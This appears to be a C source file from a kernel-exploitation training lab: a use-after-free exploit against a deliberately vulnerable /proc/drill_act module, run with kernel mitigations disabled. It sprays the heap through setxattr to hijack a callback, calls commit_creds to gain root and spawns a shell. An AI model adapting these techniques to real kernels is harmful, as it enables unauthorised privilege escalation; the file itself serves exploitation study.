/*
 * Funny experiments with Linux kernel exploitation:
 * a basic use-after-free exploit invoking a callback
 * in the freed `drill_item_t` struct.
 *
 * Only basic methods. Just for fun.
 *
 * 1) Compile the Linux kernel without:
 *   - CONFIG_SLAB_BUCKETS
 *   - CONFIG_RANDOM_KMALLOC_CACHES
 *
 * 2) Disable mitigations:
 *   - run qemu with "-cpu qemu64,-smep,-smap".
 *   - run the kernel with "pti=off nokaslr".
 */

#define _GNU_SOURCE

#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/syscall.h>
#include <stdbool.h>
#include <sys/wait.h>
#include <sys/mman.h>
#include <stdint.h>
#include <sys/xattr.h>
#include <assert.h>
#include <sched.h>
#include "drill.h"

#define MMAP_SZ			0x1000
#define PAYLOAD_SZ		95

/* ============================== Kernel stuff ============================== */

/* Addresses from System.map (no KASLR) */
#define COMMIT_CREDS_PTR	0xffffffff810c3ea0lu
#define PREPARE_KERNEL_CRED_PTR	0xffffffff810c4130lu
#define INIT_TASK_PTR	0xffffffff82a0c940lu

typedef int __attribute__((regparm(3))) (*_commit_creds)(unsigned long cred);
typedef unsigned long __attribute__((regparm(3))) (*_prepare_kernel_cred)(unsigned long cred);

_commit_creds commit_creds = (_commit_creds)COMMIT_CREDS_PTR;
_prepare_kernel_cred prepare_kernel_cred = (_prepare_kernel_cred)PREPARE_KERNEL_CRED_PTR;

void root_it(void)
{
	commit_creds(prepare_kernel_cred(INIT_TASK_PTR));
}

/* ========================================================================== */

void do_cpu_pinning(void)
{
	int ret = 0;
	cpu_set_t single_cpu;

	CPU_ZERO(&single_cpu);
	CPU_SET(0, &single_cpu);

	ret = sched_setaffinity(0, sizeof(single_cpu), &single_cpu);
	if (ret != 0) {
		perror("[-] sched_setaffinity");
		exit(EXIT_FAILURE);
	}

	printf("[+] pinned to CPU #0\n");
}

void run_sh(void)
{
	pid_t pid = -1;
	char *args[] = {
		"/bin/sh",
		"-i",
		NULL
	};
	int status = 0;

	pid = fork();

	if (pid < 0) {
		perror("[-] fork");
		return;
	}

	if (pid == 0) {
		execve("/bin/sh", args, NULL); /* Should not return */
		perror("[-] execve");
		exit(EXIT_FAILURE);
	}

	if (wait(&status) < 0)
		perror("[-] wait");
}

void init_payload(char *p, size_t size)
{
	struct drill_item_t *item = (struct drill_item_t *)p;

	memset(p, 0x41, size);

	item->callback = root_it;

	printf("[+] payload:\n");
	printf("\tstart at %p\n", p);
	printf("\tcallback at %p\n", &item->callback);
	printf("\tcallback 0x%lx\n", (unsigned long)item->callback);
}

int act(int fd, int code, int n, char *args)
{
	char buf[DRILL_ACT_SIZE] = { 0 };
	size_t len = 0;
	ssize_t bytes = 0;

	if (args)
		snprintf(buf, DRILL_ACT_SIZE, "%d %d %s", code, n, args);
	else
		snprintf(buf, DRILL_ACT_SIZE, "%d %d", code, n);

	len = strlen(buf) + 1; /* with null byte */
	assert(len <= DRILL_ACT_SIZE);
	printf("    going to write \"%s\" (%zu bytes) to drill_act\n", buf, len);

	bytes = write(fd, buf, len);
	if (bytes <= 0) {
		perror("[-] write");
		return EXIT_FAILURE;
	}
	if (bytes != len) {
		printf("[-] wrote only %zd bytes to drill_act\n", bytes);
		return EXIT_FAILURE;
	}

	return EXIT_SUCCESS;
}

int main(void)
{
	char *spray_data = NULL;
	int ret = EXIT_FAILURE;
	int fd = -1;
	int spray_fd = -1;

	printf("begin as: uid=%d, euid=%d\n", getuid(), geteuid());

	/*
	 * Prepare
	 */
	do_cpu_pinning();

	spray_data = mmap(NULL, MMAP_SZ, PROT_READ | PROT_WRITE,
					MAP_SHARED | MAP_ANONYMOUS, -1, 0);
	if (spray_data == MAP_FAILED) {
		perror("[-] mmap");
		goto end;
	}

	init_payload(spray_data, MMAP_SZ);

	fd = open("/proc/drill_act", O_WRONLY);
	if (fd < 0) {
		perror("[-] open drill_act");
		goto end;
	}

	printf("[+] drill_act is opened\n");

	spray_fd = open("./foobar", O_CREAT, S_IRUSR | S_IWUSR);
	if (spray_fd < 0) {
		perror("[-] open failed");
		goto end;
	}

	printf("[+] spray fd is opened\n");

	if (act(fd, DRILL_ACT_ALLOC, 3, NULL) == EXIT_FAILURE)
		goto end;
	printf("[+] DRILL_ACT_ALLOC\n");

	if (act(fd, DRILL_ACT_CALLBACK, 3, NULL) == EXIT_FAILURE)
		goto end;
	printf("[+] DRILL_ACT_CALLBACK\n");

	/*
	 * Exploit
	 */

	if (act(fd, DRILL_ACT_FREE, 3, NULL) == EXIT_FAILURE)
		goto end;
	printf("[+] DRILL_ACT_FREE\n");

	ret = setxattr("./", "foobar", spray_data, PAYLOAD_SZ, 0);
	printf("setxattr returned %d\n", ret);

	if (act(fd, DRILL_ACT_CALLBACK, 3, NULL) == EXIT_FAILURE)
		goto end;
	printf("[+] DRILL_ACT_CALLBACK\n");

	if (getuid() == 0 && geteuid() == 0) {
		printf("[+] finish as: uid=0, euid=0, start sh...\n");
		run_sh();
		ret = EXIT_SUCCESS;
	} else {
		printf("[-] heap spraying\n");
	}

end:
	if (spray_fd >= 0) {
		ret = close(spray_fd);
		if (ret != 0)
			perror("[-] close spray_fd");
	}

	if (fd >= 0) {
		ret = close(fd);
		if (ret != 0)
			perror("[-] close fd");
	}

	return ret;
}
